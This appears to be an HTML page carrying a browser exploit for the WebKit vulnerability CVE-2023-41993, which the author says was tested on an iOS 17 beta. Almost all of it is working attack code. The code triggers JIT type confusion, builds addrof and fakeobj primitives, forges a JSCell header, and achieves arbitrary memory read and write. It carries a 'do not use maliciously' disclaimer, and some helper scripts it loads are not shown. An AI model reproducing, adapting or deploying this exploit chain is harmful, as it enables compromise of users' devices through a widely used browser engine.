
<!DOCTYPE html>
<html>
<body>
<h1>Exploit for CVE-2023-41993</h1>
<script src="./util.js"></script>
<script src="./int64.js"></script>
<script src="./helper.js"></script>
<script>
/*
semi-weaponized exploit for CVE-2023-41993
tested on iOS 17.0 Beta 2 on iPhone 14 Pro Max
Author: https://github.com/0x06060606
*** DO NOT USE THIS EXPLOIT FOR MALICIOUS PURPOSES ***
poc: https://github.com/po6ix/POC-for-CVE-2023-41993/tree/main
poc author: @po6ix
commit: https://github.com/WebKit/WebKit/commit/08d5d17c766ffc7ca6a7c833c5720eb71b427784
advisory: https://support.apple.com/en-us/HT213926
*/

function hax(type) {
    let object_a = {};
    object_a.foo = 1;
    object_a.p1 = 1.1;
    let object_b = {};
    object_b.__defineGetter__('p1', getter);
    object_b.foo = 1;
    function get_getterSetter(type) {
        let o, retval;
        if (type == 0) o = object_a;
        else o = object_b;
        for (let i = 0; i < 2; ++i) {
            if (type == 0) retval = o.foo;
            else retval = o.foo;
        }
        return retval;
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    return [getter, get_getterSetter(1)];
}

function setup_addrof_fakeobj() {
    var getter, getterSetter;
    for (let i = 1; i <= ITERATIONS; i++) {
        [getter, getterSetter] = hax();
        try {
            getterSetter.toString();
        } catch(e) {
            break;
        }
    }
    if (getterSetter == undefined) {
        log("Failed to trigger getterSetter!");
        alert("Failed to trigger getterSetter!");
        location.reload();
        return [null, null];
    } else {
        let symbolObject = Object(getterSetter);
        let ref_arr = [];
        for (let i = 0; i < offsets.factor; ++i) {
            ref_arr.push(symbolObject.description);
        }
        getter.p13 = 1.1;
        let unboxed_arr = getter;
        let addrof = function addrof(o) {
            boxed_arr[8] = o;
            var addr = unboxed_arr[0];
            boxed_arr[8] = null;
            return addr;
        }
        let fakeobj = function fakeobj(addr) {
            unboxed_arr[0] = addr;
            var fake = boxed_arr[8];
            boxed_arr[8] = null;
            return fake;
        }
        return [addrof, fakeobj];
    }
}

function setup_rw(){
    SetupOffsets();
    log("Stage 1: setup addrof and fakeobj");
    for(let i=0; i<MAX_ITERATIONS; i++) {
        let tmp = -2;
        Foo(arr, tmp);
    }
    Foo(arr, -2147483648);
    let [raw_addrof, raw_fakeobj] = setup_addrof_fakeobj();
    function addrof(obj) {
        return Int64.fromDouble(raw_addrof(obj));
    }
    function fakeobj(addr) {
        return raw_fakeobj(addr.asDouble());
    }
    log("Stage 2: setup r/w primitive");
    function LeakStructureID(obj) {
        let container = {
            cellHeader: i2obj(0x0108200700000000),
            butterfly: obj
        };
        let fakeObjAddr = Add(addrof(container), 0x10);
        let fakeObj = fakeobj(fakeObjAddr);
        f64[0] = fakeObj[0];
        let structureID = u32[0];
        u32[1] = 0x01082307 - 0x20000;
        container.cellHeader = f64[0];
        return [structureID, container, fakeObj];
    }
    let float_arr = [Math.random(), 1.1, 2.2, 3.3, 4.4, 5.5, 6.6];
    var [structureID, container, fake_arr] = LeakStructureID(float_arr);
    log("[*] Leak float array structure ID: " + structureID);
    let results = [];
    for (let i = 0; i < 2; i++) {
        let a = i == 0 ? fake_arr : float_arr;
        results.push(a[0]);
    }
    jscell_header = results[0];
    container.jscell_header = jscell_header;
    log(`[*] Copied legit JSCell header: ${Int64.fromDouble(jscell_header)}`);
    let controller = fake_arr;
    let memarr = float_arr;
    function read64(addr) {
        let oldval = controller[1];
        let res;
        let i = 0;
        do {
            controller[1] = addr.asDouble();
            res = memarr[i];
            addr = Sub(addr, 8);
            i += 1;
        } while (res === undefined);
        controller[1] = oldval;
        return Int64.fromDouble(res);
    }
    function write64(addr, val) {
        let oldval = controller[1];
        let res;
        let i = 0;
        do {
            controller[1] = addr.asDouble();
            res = memarr[i];
            addr = Sub(addr, 8);
            i += 1;
        } while (res === undefined);
        memarr[i-1] = val.asDouble();
        controller[1] = oldval;
    }
    let testarray = [1.1, 2.2, 3.3, 4.4, 5.5];
    let testarray_addr = addrof(testarray);
    let testarray_before = read64(testarray_addr);
    write64(testarray_addr, new Int64(0x41414141));
    let testarray_after = read64(testarray_addr);
    if (testarray_after.toString() == new Int64(0x41414141)) {
        log("[+] Achieved limited arbitrary read/write \\o/");
        var isPAC = function() {
            var sinFuncAddr = addrof(Math.sin);
            var sinFunc = read64(sinFuncAddr);
        }

    } else {
        log("[-] Failed to achieve limited arbitrary read/write :(");
        alert("[-] Failed to achieve limited arbitrary read/write :(");
        location.reload();
        return;
    }
}

setup_rw();

</script>
</body>
</html>